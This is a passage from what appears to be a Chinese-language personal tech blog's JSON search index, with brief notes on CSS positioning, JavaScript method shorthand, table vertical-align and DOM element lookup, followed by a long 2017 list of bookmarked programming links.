examples](https://github.com/denysdovhan/wtfjs)\n[wtf.js](https://gist.github.com/MichalZalecki/c964192f830360ce6361)","categories":["JavaScript"]},{"title":"[CSS] 我的錯誤觀念position:absolute","url":"%2Fblog%2F2017%2F05%2F12%2Flogdown%2F2017-05-12-css-erroneous-notions-that-i-positionabsolute%2F","content":"今天做自我介紹排版練習\n我以前學position:absolute\n印象以為都以瀏覽器body:左上邊開使算(在沒用  position: relative情況下)\n但今天做巢狀position:absolute ，排版跟我想排出來的不太一樣\n在此做筆記\n\n錯誤的東西吸收很難再做修正\n在此記錄一些東西，可以回來復習\n\n\n\n資料來源：\nhtml - Positioning a nested DIV relative to the page and not the first positioned ancestor - Stack Overflow\nhttp://stackoverflow.com/questions/36778547/positioning-a-nested-div-relative-to-the-page-and-not-the-first-positioned-ances\n\nJS Bin - Collaborative JavaScript Debugging\nhttp://jsbin.com/jaqogezane/edit?html,css,output\n\nhtml css基础篇 - 笔记 - 前端网（QDFuns）\nhttp://www.qdfuns.com/notes.php?mod=view&u=25414&id=f9d7d2e2e25c2bef1eca4db2ed00bae0\n\n实例演示div+css的绝对定位和相对定位布局 - - ITeye技术网站\nhttp://xinklabi.iteye.com/blog/1825865\n\n实例演示div+css的绝对定位和相对定位 - CSS3知识库\nhttp://lib.csdn.net/article/css3/51716\n\n知识库 - 你身边的技术百科全书 - CSDN\nhttp://lib.csdn.net/home\n\n\n\n CSS3 技能圖\n\nhttp://lib.csdn.net/base/css3/structure\n\n知识库 - 你身边的技术百科全书 - CSDN\nhttp://lib.csdn.net/bases/fd/Software-Develop/ast/frontend#md\n\nCSS3知识库 - 知识库 - 你身边的技术百科全书 - CSDN\nhttp://lib.csdn.net/base/css3\n\nAngularJS知识库 - 知识库 - 你身边的技术百科全书 - CSDN\nhttp://lib.csdn.net/base/angularjs\n\nCSDN.NET - 全球最大中文IT社区，为IT专业技术人员提供最全面的信息传播和服务平台\nhttp://www.csdn.net/?ref=toolbar\n\n\n","tags":["position"],"categories":["CSS"]},{"title":"[JavaScript]Method definitions(js物件裡function縮寫)","url":"%2Fblog%2F2017%2F05%2F04%2Flogdown%2F2017-05-04-1790922%2F","content":"```js\nvar obj = {\n  foo: function() {\n    /* code */\n  },\n  bar: function() {\n    /* code */\n  }\n};\n```\n\n```js\nvar obj = {\n  foo() {\n    /* code */\n  },\n  bar() {\n    /* code */\n  }\n};\n```\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Method_definitions","tags":["Method definitions"],"categories":["JavaScript"]},{"title":"[CSS]table td預設是vertical-align: middle???","url":"%2Fblog%2F2017%2F05%2F02%2Flogdown%2F2017-05-02-1784726%2F","content":"採到雷\n\n\n```\nthead, tbody,\ntfoot           { vertical-align: middle }\ntd, th, tr      { vertical-align: inherit }\n```\n\nhttp://stackoverflow.com/questions/33487148/default-value-of-vertical-align-for-table-cells\nhttps://www.w3.org/TR/CSS2/sample.html","tags":["vertical-align"],"categories":["CSS"]},{"title":"[JavaScript]JavaScript原生的找子元素(getElementsByClassName)","url":"%2Fblog%2F2017%2F05%2F01%2Flogdown%2F2017-05-01-1780467%2F","content":"最近幫新進同事看code，因為帶他的人是使用JavaScript\n原本想說盡量使用動態抓取，後來不知道原生怎麼寫\n結果還是使用 `$('#table').find(' tr').size()`\n\n<!--more-->\n\n想說JavaScript應該也是有抓法才對\n\n就上網找了一下資訊\n原本以為可以Document.getElementById('id').getElementsByName('xxxx')\n結果是我錯了orz\n\ndocument.getElementById(\"intro\");\ndocument.getElementsByName()\n\n\nElement.getElementsByClassName()\nElement.getElementsByTagName()\n\n```\n<form name='form1_name' id='form1_id'>\n</form>\n```\n\ndocument.form1_name;\ndocument.forms['form1_id']\n\ndocument\n\nhttps://www.w3schools.com/js/js_htmldom_elements.asp\n\n\n\n參考來源：\nJavaScript DOM Elements\nhttps://www.w3schools.com/js/js_htmldom_elements.asp\ndocument.getElementsByClassName\nhttps://www.w3schools.com/js/js_htmldom_elements.asp\nElement - Web APIs | MDN\nhttps://developer.mozilla.org/zh-TW/docs/Web/API/Element\nWhat's the point of HTML forms `name` attribute? - Stack Overflow\nhttp://stackoverflow.com/questions/8946320/whats-the-point-of-html-forms-name-attribute\nElement.name - Web APIs | MDN\nhttps://developer.mozilla.org/en-US/docs/Web/API/Element/name\nDOM Version\nhttps://www.w3schools.com/jsref/coll_doc_forms.asp\nDOM概述 - Web API 接口 | MDN\nhttps://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction\n.form1DOM Level\nhttp://blog.xuite.net/abgne/diary1/5896789-%E5%8F%96%E5%BE%97+HTML+%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0\nDOM Level 要了解嗎 - Google 搜尋\nhttps://www.google.com.tw/search?q=DOM+Level+%E8%A6%81%E4%BA%86%E8%A7%A3%E5%97%8E&ei=jzcHWcCgIcW10ATyk7-YAw&start=10&sa=N&biw=1600&bih=809\nJavaScript浏览器对象——表单（Form）\nhttp://www.monmonkey.com/javascript/liulanqi8.html\n","tags":["getElementsByClassName"],"categories":["JavaScript"]},{"title":"2017隨意筆記紀錄","url":"%2Fblog%2F2017%2F04%2F30%2Flogdown%2F2017-04-30-1775577%2F","content":"\n[←2015 隨意筆記紀錄](2015-random-notes)\n沒有 2016...，這一定有什麼誤會\n\n<!--more-->\n\n2017.n\n\n用一行 CSS 做出全螢幕區塊 (Make full screen sections with 1 line of CSS) & Yijen's blog - hanasan # 天空部落 TIAN #\nhttp://hanasan.tian.yam.com/posts/81767301\n\nBootstrap modal overflow - JSFiddle\nhttp://jsfiddle.net/jasny/zclse/\n\nJavascript 設計模式(筆記) (1) 精要＠WFU BLOG\nhttp://www.wfublog.com/2012/10/javascript-patterns-1.html\n\nJavascript 語法教學、技巧 (筆記)＠WFU BLOG\nhttp://www.wfublog.com/2012/04/javascript.html\n\n支援 BootStrap 的所見即所得的網頁編輯工具 | Soft & Share\nhttps://softnshare.wordpress.com/2016/\n01/31/%E6%94%AF%E6%8F%B4bootstrap%E7%9A%84%E6%89%80%E8%A6%8B%E5%8D%B3%E6%89%80%E5%BE%97%E7%9A%84%E7%B6%B2%E9%A0%81%E7%B7%A8%E8%BC%AF%E5%B7%A5%E5%85%B7/\n認識 Git 資料結構中的物件資料庫與物件之間的關係 - YouTube\nhttps://www.youtube.com/watch?v=PZbSRy_ow0U\n\n葉難: Arduino：在 Windows 裡使用 Python 語言經由 Firmata 協定控制 Arduino 開發板\nhttp://yehnan.blogspot.com/2016/01/arduinowindowspythonfirmataarduino.html\n\n找不到頁面 - vMaker 台灣自造者 vMaker 台灣自造者 | Page 77\nhttps://vmaker.tw/project/view/77\n\nUSB 連線使用 Webduino Blockly\nhttp://blog.ilc.edu.tw/blog/index.php?op=printView&articleId=625816&blogId=868\n\nHow to format a JavaScript date - Stack Overflow\nhttp://stackoverflow.com/questions/3552461/how-to-format-a-javascript-date\n\nSetting up Sublime Text 3 for Rails Development | mattbrictson.com\nhttps://mattbrictson.com/sublime-text-3-recommendations\n\n使用網頁安裝 | Sublime 安裝與教學\nhttps://dissidia3408.gitbooks.io/sublime-text-tutorial/content/browser-add.html\n\n首頁 | Sublime 安裝與教學\nhttps://dissidia3408.gitbooks.io/sublime-text-tutorial/content/index.html\n\nLinux 如何在開機的時候直接進入文字(命令列)介面？ | MagicLen\nhttps://magiclen.org/linux-text/\n\nfor...of - JavaScript | MDN\nhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...of\n\n搞懂這些，你也可以大聲說”我搞定 IE8 了！” – 25sprout\nhttps://blog.25sprout.com/%E6%90%9E%E6%87%82%E9%80%99%E4%BA%9B-%E4%BD%A0%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%81%B2%E8%AA%AA-%E6%88%91%E6%90%9E%E5%AE%9A-ie8-%E4%BA%86-8ca3ca1f6367\n\n[ASP.NET] 實現與防範 CSRF 跨網站請求偽造攻擊 | .Net 蛤什麼? - 點部落\nhttps://dotblogs.com.tw/joysdw12/archive/2013/09/16/asp-net-cross-site-request-forgery.aspx\n\nAndroid Development: some of the best practices. Jun 2016 edition. – Medium\nhttps://medium.com/@stepango/android-development-some-of-the-best-practices-jun-2016-edition-e505a0558a71\n\nJQuery Cycle Plugin\nhttp://jquery.malsup.com/cycle/\n\nCycle2\nhttp://jquery.malsup.com/cycle2/\n\nRaspberry Pi • View topic - Rootfs and /dev/root full\nhttps://www.raspberrypi.org/forums/viewtopic.php?t=71520&p=521414\n\nCSS Font-Size: em、px 、pt 、Percent 之间的关系及换算*CSS 教程\\_CSS*网页制作\\_脚本之家\nhttp://m.jb51.net/css/166291.html\n\nWeb Design Clip | Web デザインクリップ\nhttp://www.webdesignclip.com/\n\n慶應義塾\nhttps://www.keio.ac.jp/ja/\n\nFunctional Reactive Programming 的入門心得 – Medium\nhttps://medium.com/@rayshih771012/functional-reactive-programming-70be6bd8726b\n\njavascript - jQuery watch for domElement changes? - Stack Overflow\nhttp://stackoverflow.com/questions/1960919/jquery-watch-for-domelement-changes\n\njavascript - DOMsubtreemodified equivalent in IE - Stack Overflow\nhttp://stackoverflow.com/questions/19869547/domsubtreemodified-equivalent-in-ie\n\nJavaScript 語言核心（11）this 是什麼？ by caterpillar | CodeData\nhttp://www.codedata.com.tw/javascript/essential-javascript-11-what-is-this/\n\nApache Ant™ User Manual\nhttp://ant.apache.org/manual/index.html\n\nhttp://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html\nhttp://yhhuang1966.blogspot.com/2015/07/esp8266-wifi-at-command.html\n\nㄆㄜ ㄊㄧㄡ ㄙ ˋ: 自行更新 ESP8266 , ESP-01 無線模組韌體至 AT：0.23, SDK：1.0.1\nhttp://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html\n\nㄆㄜ ㄊㄧㄡ ㄙ ˋ: 自行更新 ESP8266 , ESP-01 無線模組韌體至 AT：0.23, SDK：1.0.1\nhttp://ruten-proteus.blogspot.com/2015/05/esp8266-esp-01-at023-sdk101.html?view=classic\n\n頁面載入發生問題\nfile:///C:/Users/ADMINI~1/AppData/Local/Temp/Arduino_ESP8266.pdf\n\nNodeList - Web APIs | MDN\nhttps://developer.mozilla.org/zh-TW/docs/Web/API/NodeList\n\njavascript - How to remove all listeners in an element? - Stack Overflow\nhttp://stackoverflow.com/questions/9251837/how-to-remove-all-listeners-in-an-element\n\nnode.js - How do I include a JavaScript file in another JavaScript file? - Stack Overflow\nhttp://stackoverflow.com/questions/950087/how-do-i-include-a-javascript-file-in-another-javascript-file\n\nCSS & HTML - 純 CSS 點擊下拉式選單 - Twincl\nhttps://tw.twincl.com/css-html/*6630\n\n[讀書筆記] CSS 基礎技巧懶人包 « Blog.XDite.net\nhttp://blog.xdite.net/posts/2012/01/29/css-tricks-summary\n\nEne | ToMo Forunesia\nhttp://tomo.forunesia.com/pin/1950/\n\nJSManipulate - Javascript Image Filters & Effects\nhttp://joelb.me/jsmanipulate/\n\nWhy JQuery (> 3.x) Promise is ok - JSFiddle\nhttp://fiddle.jshell.net/mbychawski/77Lxzjzq/\n\n三個不要再用 jQuery Promise 的理由 « Pymaster\nhttp://pymaster.logdown.com/post/379240-3-do-not-use-jquery-promise-from-todays-reason\n\nShiny\nhttps://blog.shinychang.net/\n\nVuedinner #1 第一次用 Vue.js 就愛上 by Kuro - YouTube\nhttps://www.youtube.com/watch?v=jXdZlbH_ut8&feature=youtu.be\n\n【教學】SSD 優化 (1) 4K 對齊 【以 Win10 為例】 @ 歐飛先生 :: 痞客邦 PIXNET ::\nhttp://ofeyhong.pixnet.net/blog/post/190625809-%E3%80%90%E6%95%99%E5%AD%B8%E3%80%91ssd-%E5%84%AA%E5%8C%96-(1)-4k%E5%B0%8D%E9%BD%8A--%E3%80%90%E4%BB%A5win10%E7%82%BA%E4%BE%8B%E3%80%91\n\n【Youtube API】jQurry 控制 Youtube 播放器：Youtube API 控制、崁入播放程式、jQuery 播放 Youtube | ucamc\nhttp://www.ucamc.com/e-learning/javascript/104-youtube-api-jquery.html\n\n[JavaScript] How to Control YouTube AutoPlay and Play after another video end. | Blackie 的失敗筆記 - 點部落\nhttps://dotblogs.com.tw/blackie1019/2014/09/17/146581\n\n【YouTube】(三)如何透過 YouTube IFrame Player API 控制 Youtube 撥放器？ - Elaine Wu\nhttp://blog.elaine-iic.tw/2015/07/youtube-iframe-player-api.html\n\nBuild Amazing Native Apps and Progressive Web Apps with Ionic Framework and Angular\nhttp://ionicframework.com/\n\nKingKong Bruce 記事: DOM 修改文字節點 - innerText 或 textContent 傻傻分不清楚\nhttp://blog.kkbruce.net/2013/10/js-dom-edit-text-node-select-innerText-or-textContent.html\n\nPage Not Found – Elaine personal website\nhttp://blog.elaine.me/so-simple-theme/articles/React-webpack/\n\n深入了解 JavaScript 模組化模式 « EasonLin's Blog\nhttp://easonlin.logdown.com/posts/74228-javascript-module-pattern-in-depth\n\nnode-webkit 教程(9)native api 之 Tray(托盘) | nw.js 中文文档\nhttps://wizardforcel.gitbooks.io/nwjs-doc/content/tutorial/9.html\n\nColorDrop 你唯一需要的線上調色盤！收錄各種配色組合，提供設計開發上絕佳色彩來源｜數位時代\nhttps://www.bnext.com.tw/ext_rss/view/id/1828803\n\n簡單弄一弄 Apache 的 Proxy 功能 – roga's blog\nhttps://blog.roga.tw/2006/10/325\n\nScrapy + Python 3: PTT 資料抓取與分析 - 翼之都, City of Wings\nhttp://city.shaform.com/blog/2016/02/28/scrapy.html\n\nFront-end-Developer-Interview-Questions - 前端工程師面試問題集(繁體中文版)\nhttps://gist.github.com/jaceju/3e5ee109de63cb4c756b\n\njaceju’s gists\nhttps://gist.github.com/jaceju\n\n[Javascript] 幾個實用的 JS 小技巧 · Larry\nhttp://larry850806.github.io/2016/07/16/JS-tips/\n\nPage not found · GitHub Pages\nhttp://liyaodong.com/2016/04/15/webpack-the-confusing-parts/\n\n5500+ Best jQuery Plugins & Tutorials with jQuery Demo examples 2017 - 2016\nhttp://www.jqueryrain.com/\n\n[工具使用]讓別人把檔案上傳到你的 Google Drive | John Wan's Blog\nhttps://\nwanchiahung.wordpress.com/2015/12/16/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E8%AE%93%E5%88%A5%E4%BA%BA%E6%8A%8A%E6%AA%94%E6%A1%88%E4%B8%8A%E5%82%B3%E5%88%B0%E4%BD%A0%E7%9A%84google-drive/\n原來 Google 雲端硬碟也能開放「匿名上傳」，做為學生作業、比賽稿件上傳就不用再傷腦筋了！(Google Apps Script 應用服務指令碼)\nhttp://harmonica80.blogspot.com/2015/08/googlegoogle-apps-script.html\n\n基于 webpack 和 vue.js 搭建的 H5 端框架(其实主要用于 Hybrid 开发 H5 端框架，但是依然能够作为纯 web 端使用) | HcySunYang's Blog\nhttp://hcysun.me/2016/03/25/%E5%9F%BA%E4%BA%8Ewebpack%E5%92%8Cvue.js%E6%90%AD%E5%BB%BA%E7%9A%84H5%E7%AB%AF%E6%A1%86%E6%9E%B6(%E5%85%B6%E5%AE%9E%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8EHybrid%E\n5%BC%80%E5%8F%91H5%E7%AB%AF%E6%A1%86%E6%9E%B6%EF%BC%8C%E4%BD%86%E6%98%AF%E4%BE%9D%E7%84%B6%E8%83%BD%E5%A4%9F%E4%BD%9C%E4%B8%BA%E7%BA%AFweb%E7%AB%AF%E4%BD%BF%E7%94%A8)/\njs Worker API 在倒计时中的使用 | HcySunYang's Blog\nhttp://hcysun.me/2016/07/11/js-Worker-API-%E5%9C%A8%E5%80%92%E8%AE%A1%E6%97%B6%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/\n\na 标签的 href 属性与 click 事件的烦恼 | HcySunYang's Blog\nhttp://hcysun.me/2015/11/26/a%E6%A0%87%E7%AD%BE%E7%9A%84href%E5%B1%9E%E6%80%A7%E4%B8%8Eclick%E4%BA%8B%E4%BB%B6%E7%9A%84%E7%83%A6%E6%81%BC/\n\n資訊分享: JSLint 的錯誤提示都是什麼意思\nhttp://mark0120.blogspot.com/2016/03/jslint.html?view=sidebar&m=1\n\n嫁給 RD 的 UI Designer · 嫁給 RD 的 UI Designer\nhttps://blog.akanelee.me/\n\nDrupal 8 主题开发指南中文版 · GitBook\nhttps://www.gitbook.com/book/ranqiangjun/the-drupal-8-theming-guide/details\n\n閃亮亮大師之路\nhttp://blog.dj1020.net/\n\nESP8266-workshop // Speaker Deck\nhttps://speakerdeck.com/mlwmlw/esp8266-workshop/\n\nESP8266 - HackMD\nhttps://hackmd.io/s/NJofJDChx\n\n囧星人 | 冏星人 Kyon\nhttp://kyontw.com/#works\n\nInstalling VMware Tools in an Ubuntu virtual machine (1022525) | VMware KB\nhttps://kb.vmware.com/selfservice/search.do?cmd=displayKC&docType=kc&docTypeID=DT_KB_1_1&externalId=1022525\n\n茫茫網海中的冷日 - [轉貼]設定 MySQL 連線數\nhttp://www.coolsun.idv.tw/modules/xhnewbb/viewtopic.php?topic_id=1486&viewmode=flat\n\nmysql - How can I set the default value of a field as '0000-00-00 00:00:00'? - Stack Overflow\nhttp://stackoverflow.com/questions/25349126/how-can-i-set-the-default-value-of-a-field-as-0000-00-00-000000\n\nDocker Infra 架構簡介與實例 // TsaiKD Blog\nhttps://tsaikd.org/blog/2014/12-25-Docker-infra/\n\nDocumentation - Materialize\nhttp://materializecss.com/\n\nSublime Text (3) for PHP Developers - Matt Stauffer on Laravel, PHP, Frontend development\nhttps://mattstauffer.co/blog/sublime-text-3-for-php-developers\n\nAdd IBM Java SDK from WebSphere in IntelliJ - YouTube\nhttps://www.youtube.com/watch?v=6M1nXdpQqnI\n\nPage not found · GitHub Pages\nhttp://blog.chivincent.net/pages/toolbox\n\nJSON Generator – Tool for generating random data\nhttp://www.json-generator.com/\n\nVuediner #2 - Ping Pong ! Vuex + Laravel by 鄭宇翔 - YouTube\nhttps://www.youtube.com/watch?v=C1aLFTs6QM8\n\n用 JavaScript 學習資料結構和演算法：堆疊（Stack）篇 | TechBridge 技術共筆部落格\nhttp://blog.techbridge.cc/2016/06/24/javascript-data-structure-algorithm-stack/\n\nLinux DHCP DNS 設定問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天\nhttp://ithelp.ithome.com.tw/articles/10071258\n\nUI 動態資源分享 « YUNCHI\nhttp://yunchi-blog.logdown.com/posts/223094-ui-dynamic-resource-sharing\n\nHero Fighter, Little Fighter 2 Official Forum • View topic - LF1 Data.dat 改檔 重見天日!\nhttp://ztage.com/forum/viewtopic.php?f=3&t=10761\n\nZwe's blog: linux 讓終端機有顏色\nhttp://zwe0405.blogspot.tw/2011/10/linux.html\n\n權限不足\nhttps://sites.google.com/a/google.com/cloud-platform-training/cloud-platform-training/?pli=1\n\nGAE Java IDE installation\nhttps://www.slideshare.net/peihsinsu/gae-java-ide-installing-eclipseide-1\n\nGoogle Cloud Platform Pricing Calculator  |  Google Cloud Platform\nhttps://cloud.google.com/products/calculator/\n\n小狐狸事務所: ESP8266 更新韌體\nhttp://yhhuang1966.blogspot.com/2015/08/esp8266.html\n\n活動報名 | 財團法人開放文化基金會\nhttps://ocf.neticrm.tw/civicrm/event/register?_qf_ThankYou_display=1&qfKey=1aa9e3458ac09bae24bfb0c7c7fc2fff_2087\n\n簡易 git server 架設教學 (用 Ubuntu linux) | 小 B 雜 Blog\nhttp://mix.bruceli.net/2011/02/git-server-ubuntu-linux.html\n\n浮雲雅築: [研究] Ubuntu 14.04 Desktop x64 安裝 VMware Tools 9.6.2\nhttp://shaurong.blogspot.com/2014/07/ubuntu-1404-desktop-x64-vmware-tools-962.html\n\nhttps://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/\nhttps://www.computersnyou.com/266/how-to-solve-vmware-is-using-port-443/\n\nhttp://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb\nhttp://soarlin.pixnet.net/blog/post/42810173-%E4%BD%BF%E7%94%A8-gitolite-%E6%9E%B6%E8%A8%AD-git-server%EF%BC%8C%E4%B8%A6%E5%AE%89%E8%A3%9D-gitweb\n\n使用 Git Mirror 無痛轉移 Git Server | 不怕就是強\nhttps://dinos80152.wordpress.com/2015/09/21/%E4%BD%BF%E7%94%A8-git-mirror-%E7%84%A1%E7%97%9B%E8%BD%89%E7%A7%BB-git-server/\n\nChromatic Coder: 架設 Gerrit 和 Git\nhttp://blog.dsmu.me/2013/04/gerritgit.html\n\n11 个超棒的 jQuery 分步指引插件 - Web 前端 - ITeye 资讯\nhttp://www.iteye.com/news/27626\n\nLinux 架設使用 SSH 共享存取的 Git Server - Tsung's Blog\nhttps://blog.longwin.com.tw/2011/03/build-git-env-share-over-ssh-2011/?doing_wp_cron=1471779497.9948770999908447265625\n\nCentOS 架設 GitServer « Sam 的程式筆記\nhttp://samchu.logdown.com/posts/778052-set-up-centos-gitserver\n\nUbuntu 架設 GitServer « Sam 的程式筆記\nhttp://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver\n\nSSH 連現時出現「WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!」解決辦法 | 電腦故我在\nhttps://blog.allenchou.cc/warning-remote-host-identification-has-changed/\n\nhttp://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC\nhttp://linux988.pixnet.net/blog/post/25926301-fedora,-centos-ssh-%E7%99%BB%E5%85%A5%E5%88%B0%E9%81%A0%E7%AB%AF-server-%E4%B8%8D%E7%94%A8%E5%AF%86%E7%A2%BC\n\n安裝 CentOS 7 後必做的七件事 – 香港網頁開發網誌\nhttps://www.hkpug.net/2014/09/18/%E5%AE%89%E8%A3%9D-centos-7-%E5%BE%8C%E5%BF%85%E5%81%9A%E7%9A%84%E4%B8%83%E4%BB%B6%E4%BA%8B/\n\ngithub 报 sign_and_send_pubkey: signing failed: agent refused operation 错误解决-呆若-ChinaUnix 博客\nhttp://newsolider.blog.chinaunix.net/uid-21142030-id-5723937.html\n\n程式扎記: [Linux 小學堂] SSH 免密碼登入\nhttp://puremonkey2010.blogspot.tw/2010/10/linux-ssh.html\n\n老宅筆記本: 給 windows 使用者的簡易 Git 環境架設\nhttps://eric0806.blogspot.com/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html\n\nhttps://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go\nhttps://www.inside.com.tw/2016/08/24/source-code-of-pokemon-go\n\nwxpython - How can I create a simple message box in Python? - Stack Overflow\nhttp://stackoverflow.com/questions/2963263/how-can-i-create-a-simple-message-box-in-python\n\nAlvin 的學習筆記 Log: Javascript 學習筆記－Javascript 的統計報表( Charts ) Library 收集\nhttp://alvinlee0327.blogspot.tw/2014/04/javascriptjavascriptlibrary.html\n\nhttp://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html\nhttp://pjchender.blogspot.com/2015/03/cssmultiple-selectorsspace.html\n\nModule 開發 - runwayShow\nhttps://www.facebook.com/notes/paul-li/module-%E9%96%8B%E7%99%BC-runwayshow/10154257159377211?qid=6328659570242092483&mf_story_key=-5054522967479182062\n\n李四端的雲端世界 - YouTube\nhttps://www.youtube.com/user/newscloudworld\n\nHow Browser work - 瀏覽器運作原理 « YJ Blog\nhttp://sj82516-blog.logdown.com/posts/860934\n\nTechBridge 技術共筆部落格\nhttp://blog.techbridge.cc/\n\nKuro's Blog\nhttps://kuro.tw/\n\nMr.typhoon\nhttps://quote-b781f.firebaseapp.com/\n\n[SVN] TortoiseSVN 筆記 - 程式心得筆記 工程屍的日子 | Mr. 一顆痣 a.k.a. bigd\nhttp://iambigd.blogspot.com/2014/04/svn-tortoisesvn.html\n\n2016 台北雙年展\nhttp://www.taipeibiennial.org/2016/#Presentation\n\ns:iterator within s:select (Struts forum at Coderanch)\nhttps://coderanch.com/t/444875/framework/iterator-select\n\nIterate through HashMap using Struts2 Iterator - TipsTrickz\nhttp://www.tipstrickz.com/iterate-through-hashmap-using-struts2-iterator/\n\njava - Parsing ArrayList of Hashmap in Struts2 tag using s:iterator - Stack Overflow\nhttp://stackoverflow.com/questions/29329355/parsing-arraylist-of-hashmap-in-struts2-tag-using-siterator\n\nstruts2 的<s:select>的用法 - ITeye 问答\nhttp://www.iteye.com/problems/93112\n\nstruts2 中 s:select 标签的使用 - 莫理琴的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/moliqin/article/details/3753570\n\n小信豬的原始部落: Java 學習筆記 (7) - Container\nhttp://godleon.blogspot.tw/2007/07/container-container-list-set-map-key.html\n\n[JAVA]ArrayList @ 摳鼎人生 :: 痞客邦 PIXNET ::\nhttp://taurus770423.pixnet.net/blog/post/281155324-%5Bjava%5Darraylist\n\nJWorld@TW Java 論壇 - 討論各種 MAP SET LIST\nhttps://www.javaworld.com.tw/jute/post/view?bid=5&id=28127&sty=1&tpg=1&age=-1\n\n泛型進階語法 | Java SE 6 技術手冊\nhttps://caterpillar.gitbooks.io/javase6tutorial/content/c12_2.html\n\nPHP 是否能輸出報表呢??\nhttp://phorum.study-area.org/index.php?topic=38934.0\n\nparticles.js - A lightweight JavaScript library for creating particles\nhttp://vincentgarreau.com/particles.js/\n\nspin.js\nhttp://spin.js.org/#!\n\n蜜柑计划 - Mikan Project\nhttp://mikanani.me/\n\nScrollMagic ♥ Demo\nhttp://scrollmagic.io/\n\n結構化資料 SEO 與 meta 標籤 - OXXO.STUDIO\nhttp://www.oxxostudio.tw/articles/201406/social-meta.html\n\nEmmet CSS Snippets\nhttp://peiwen.lu/Emmet-Css-Snippets-for-Sublime-Text-2/\n\nAtom 使用心得與 Package 推薦 ( 2016/07/26 更新) « Negai no Sekai\nhttp://negaihoshi.logdown.com/posts/220517-atom-use-ideas-and-recommendations\n\nManning | Secrets of the JavaScript Ninja\nhttps://www.manning.com/books/secrets-of-the-javascript-ninja\n\nFevolution Innovation Inc.\nhttps://www.fevolution.com/#share-happiness\n\n取得視窗維度資訊\nhttps://openhome.cc/Gossip/JavaScript/WindowDimension.html\n\n敏捷開發懶人包：物件導向技能 — 泰迪軟體\nhttp://teddysoft.tw/courses/agile-skill-ooad/\n\nIs there any good dynamic SQL builder library in Java? - Stack Overflow\nhttp://stackoverflow.com/questions/5620985/is-there-any-good-dynamic-sql-builder-library-in-java\n\n[ISUX 译转]CSS3 transition 规范的实际使用经验 - 前端技术 - 腾讯 ISUX\nhttps://isux.tencent.com/css3-transition.html\n\nCSS3 transition 介绍 - 简书\nhttp://www.jianshu.com/p/56f8ddafc63f\n\n更改 Eclipse 下 Tomcat 的部署目录 - Watson 的码步 - ITeye 技术网站\nhttp://kingxss.iteye.com/blog/1741438\n\nUsing java.net.URLConnection to fire and handle HTTP requests - Stack Overflow\nhttp://stackoverflow.com/questions/2793150/using-java-net-urlconnection-to-fire-and-handle-http-requests/2793153#2793153\n\njava - ServletFileUpload#parseRequest(request) returns an empty list - Stack Overflow\nhttp://stackoverflow.com/questions/13881272/servletfileuploadparserequestrequest-returns-an-empty-list\n\neclipse 中 server location 为灰色，不能修改 - wanwanwan123 的专栏 - 博客频道 - CSDN.NET\nhttp://blog.csdn.net/wanwanwan123/article/details/7491445\n\n詳解 struts.multipart.saveDir 的臨時文件路徑 - xlgps.com\nhttp://www.xlgps.com/article/152545.html\n\nUnable to find ‘struts.multipart.saveDir’ Struts2 上传文件错误的解决方法 | IT 宅.com\nhttp://www.itzhai.com/unable-to-find-struts-multipart-savedir-struts2-upload-file-error-solution.html\n\n史帝芬心得筆記: spring 4.x + struts 2.x + mybatis 3.x - getting started\nhttp://stevenitlife.blogspot.tw/2014/10/spring-4x-struts-2x-mybatis-3x.html\n\nservlet 使用二进制流传送请求参数，request.getPart(\"\")取不到值-CSDN 论坛-CSDN.NET-中国最大的 IT 技术社区\nhttp://bbs.csdn.net/topics/390682830\n\nSpringMVC 文件上傳接口設計與實現\\_人人 IT 網\nhttp://fanli7.net/a/bianchengyuyan/C__/20150302/538805.html\n\n【東京自由行】 - 02/02<font color=\"FA007A\"><B>自主玩</B></font>東京自由行 4 天(香草航空／1 人成行／早去晚回／不可延回) - 燦星旅遊\nhttp://www.startravel.com.tw/StarTravel.Web.IPKG/BBSingleProd.aspx?Prod_No=IPKG000009926&Grp_No=TYO04JW20217A#a4\n\n不安全的連線\nhttps://www.boca.gov.tw/ap?apName=applyDesc&mp=1\n\nhttp://misscoding.blogspot.com/2012/05/git_22.html\nhttp://misscoding.blogspot.com/2012/05/git_22.html\n\n【Git】 隨手筆記 « 和平，奮鬥，救 WEB\nhttp://fireqqtw.logdown.com/posts/196392-git-casually-notes\n\nGit 版本控制系統 | 還沒 push 前可以做的事\nhttps://ihower.tw/git/rebase.html\n\n13 Essential PHP Interview Questions and Answers | Toptal\nhttps://www.toptal.com/php/interview-questions\n\n13 Essential PHP Interview Questions and Answers | Toptal\nhttps://www.toptal.com/php/interview-questions#iquestion_form\n\n透過 JavaScript,Ruby,PHP,C# 語言，理解 Java 的 Lambda 語法 - 石頭閒語\nhttp://rocksaying.tw/archives/12742243.html\n\n深入理解什麼是 javascript 中的閉包。\\_StackDoc\nhttp://fanli7.net/a/caozuoxitong/OS/20110830/125313.html\n\nClosure 閉包 - eddychang.me\nhttp://eddychang.me/blog/javascript/84-js-clousure.html\n\n從 ES6 開始的 JavaScript 學習生活 · GitBook\nhttps://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details\n\nTag : javascript « 